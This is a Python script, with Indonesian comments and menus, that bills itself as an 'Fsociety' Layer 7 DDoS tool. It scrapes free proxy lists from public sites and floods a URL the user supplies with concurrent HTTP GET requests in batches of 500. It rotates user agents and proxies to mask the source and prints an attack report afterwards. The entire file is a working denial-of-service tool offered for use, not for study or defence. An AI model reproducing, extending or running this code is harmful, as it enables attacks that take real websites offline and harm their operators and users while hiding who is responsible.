import sys
import requests
import asyncio
import aiohttp
import random
from bs4 import BeautifulSoup
from datetime import datetime
import time
import os

# ASCII Art
ASCII_ART = """
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣠⣦⣤⣴⣤⣤⣄⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⣀⣀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣛⣛⣻⣿⣦⣀⠀⢀⣀⣀⣏⣹⠀
⢠⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠭⠭⠽⠽⠿⠿⠭⠭⠭⠽⠿⠿⠛
⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠉⢻⣿⣿⣿⡟⠏⠉⠉⣿⢿⣿⣿⣿⣇⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠉⠁⠀⠀⠀⢠⣿⣿⣿⠋⠑⠒⠒⠚⠙⠸⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⡿⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                                   
           DDOS ATTACK LAYER 7 | V 9.9.9
        
       DEVELOPER : PYSCODES | FSOCIETY TEAM
       GITHUB : https://github.com/Pyscodes-pro                                                  
                                                                                                       
                                                                              
                                                                                                                                                                          
"""

# Konfigurasi dasar
DEFAULT_REQUESTS = 1000
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
]

# Daftar sumber proxy
PROXY_SOURCES = [
    "https://www.us-proxy.org",
    "https://www.socks-proxy.net",
    "https://proxyscrape.com/free-proxy-list",
    "https://www.proxynova.com/proxy-server-list/",
    "https://proxybros.com/free-proxy-list/",
    "https://proxydb.net/",
    "https://spys.one/en/free-proxy-list/",
    "https://hasdata.com/free-proxy-list",
    "https://www.proxyrack.com/free-proxy-list/",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
]

# Fungsi untuk mendapatkan daftar proxy dari sumber online
async def fetch_proxies(source):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(source) as response:
                if response.status == 200:
                    html = await response.text()
                    # Sesuaikan parsing HTML berdasarkan sumber
                    if "us-proxy.org" in source or "socks-proxy.net" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'id': 'proxylisttable'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "proxyscrape.com" in source:
                        proxies = html.strip().split('\r\n')
                        return ["http://" + proxy for proxy in proxies]
                    elif "proxynova.com" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'id': 'tbl_proxy_list'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "proxybros.com" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'class': 'table'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "proxydb.net" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'class': 'table table-sm'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "spys.one" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'class': 'spy1xx'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "freeproxy.world" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'class': 'table table-striped table-bordered'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "hasdata.com" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'class': 'proxies'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "proxyrack.com" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'class': 'table table-striped'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "api.proxyscrape.com" in source:
                         proxies = html.strip().split('\r\n')
                         return proxies
                    else:
                        print(f"Tidak dapat memproses sumber proxy: {source}")
                        return []
                else:
                    print(f"Failed to fetch proxies from {source}. Status code: {response.status}")
                    return []
    except Exception as e:
        print(f"Error fetching proxies from {source}: {e}")
        return []

# Fungsi untuk mengumpulkan proxy dari semua sumber
async def get_all_proxies():
    all_proxies = []
    for source in PROXY_SOURCES:
        proxies = await fetch_proxies(source)
        if proxies:
            all_proxies.extend(proxies)
            print(f"Berhasil mengambil {len(proxies)} proxy dari {source}")
        else:
            print(f"Gagal mengambil proxy dari {source}")
    return all_proxies

# Fungsi untuk membersihkan layar
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Fungsi untuk menampilkan progres loading (diperbarui untuk kecepatan)
def show_progress(progress, total=100, length=50):
    percent = (progress / float(total)) * 100
    bar = '#' * int(length * progress / float(total))
    spaces = ' ' * (length - len(bar))
    print(f'\r[{bar}{spaces}] {percent:.2f}%', end='', flush=True)  # Menggunakan print langsung

# Fungsi untuk melakukan serangan DDoS (dipercepat)
async def attack(url, session, stealth_mode, proxy=None):
    headers = {'User-Agent': random.choice(USER_AGENTS)}
    try:
        if proxy:
            async with session.get(url, headers=headers, proxy=proxy, timeout=5) as response:  # Mengurangi timeout
                return "Berhasil"
        else:
            async with session.get(url, headers=headers, timeout=5) as response:  # Mengurangi timeout
                return "Berhasil"
    except:
        return "Gagal"

# Fungsi utama untuk menjalankan serangan secara bersamaan (dipercepat)
async def flood(url, num_requests, stealth_mode, use_proxy, proxies):
    clear_screen()
    print(ASCII_ART)  # Cetak ASCII art sebelum pesan serangan

    print(f"Menyerang {url} dengan {num_requests} permintaan...\n")

    success_count = 0
    failure_count = 0
    start_time = time.time()

    async with aiohttp.ClientSession() as session:
        tasks = []
        for i in range(num_requests):
            proxy = random.choice(proxies) if proxies else None
            task = asyncio.create_task(attack(url, session, stealth_mode, proxy))
            tasks.append(task)

            if len(tasks) >= 500:  # Batasi jumlah tugas untuk mencegah kelebihan beban
                results = await asyncio.gather(*tasks)
                success_count += results.count("Berhasil")
                failure_count += results.count("Gagal")
                tasks = []  # Reset daftar tugas
                show_progress((i + 1) / num_requests * 100)  # Tampilkan progres

        # Proses tugas yang tersisa
        if tasks:
            results = await asyncio.gather(*tasks)
            success_count += results.count("Berhasil")
            failure_count += results.count("Gagal")
            show_progress(100)  # Pastikan progres mencapai 100%

    end_time = time.time()
    elapsed_time = end_time - start_time

    print("\n\n===== 💣Laporan Serangan💣 =====")
    print(f"URL Target: {url}")
    print(f"Jumlah Permintaan: {num_requests}")
    print(f"Serangan Berhasil: {success_count}")
    print(f"Serangan Gagal: {failure_count}")
    print(f"Waktu yang dihabiskan: {elapsed_time:.2f} detik")
    print("==========================")

# Fungsi untuk menampilkan menu dan mendapatkan input dari pengguna
def show_menu():
    print("\n===== 🎭Fsociety DDoS Tool🎭 =====")
    print("1. Target URL")
    print("2. Threads (Default: {})".format(DEFAULT_REQUESTS))
    print("3. Stealth Mode (Saat ini: {})".format("Aktif" if stealth_mode else "Nonaktif"))
    print("4. Proxy (Saat ini: {})".format("Aktif" if use_proxy else "Nonaktif"))
    print("5. Attack")
    print("6. Exit")
    print("===============================")
    print("PILIHAN : ")
    choice = input("Pilih opsi: ")
    return choice

# Variabel global untuk menyimpan opsi
url = None
num_requests = DEFAULT_REQUESTS
stealth_mode = False
use_proxy = False
proxies = []  # Daftar proxy yang akan digunakan
ascii_printed = False  # Tambahkan variabel untuk melacak apakah ASCII sudah dicetak

# Fungsi utama yang memproses menu dan memulai serangan
def main():
    global url, num_requests, stealth_mode, use_proxy, proxies, ascii_printed

    if not ascii_printed:  # Cetak ASCII hanya sekali
        print(ASCII_ART)
        ascii_printed = True

    while True:
        choice = show_menu()

        if choice == '1':
            url = input("Masukkan Target URL: ")
        elif choice == '2':
            try:
                num_requests = int(input("Masukkan Jumlah Permintaan: "))
            except ValueError:
                print("Input tidak valid. Menggunakan jumlah permintaan default.")
                num_requests = DEFAULT_REQUESTS
        elif choice == '3':
            stealth_mode = not stealth_mode
            print("Stealth Mode sekarang: {}".format("Aktif" if stealth_mode else "Nonaktif"))
        elif choice == '4':
            use_proxy = not use_proxy
            print("Penggunaan Proxy sekarang: {}".format("Aktif" if use_proxy else "Nonaktif"))
            if use_proxy:
                print("Mengambil daftar proxy...")
                proxies = asyncio.run(get_all_proxies())
                if proxies:
                    print(f"Berhasil mengambil {len(proxies)} proxy.")
                else:
                    print("Gagal mengambil proxy. Serangan akan dilanjutkan tanpa proxy.")
                    use_proxy = False
            else:
                proxies = []
        elif choice == '5':
            if not url:
                print("Target URL belum dimasukkan. Silakan masukkan URL terlebih dahulu.")
            else:
                clear_screen()  # Bersihkan layar sebelum mencetak ASCII
                print(ASCII_ART) # Cetak ASCII art di interface kedua
                print("Memulai serangan...")
                asyncio.run(flood(url, num_requests, stealth_mode, use_proxy, proxies))
                print("Serangan selesai.")
        elif choice == '6':
            print("\n--GOOD BYE FRIEND--")
            break
        else:
            print("Opsi tidak valid. Silakan coba lagi.")

if __name__ == "__main__":
    main()
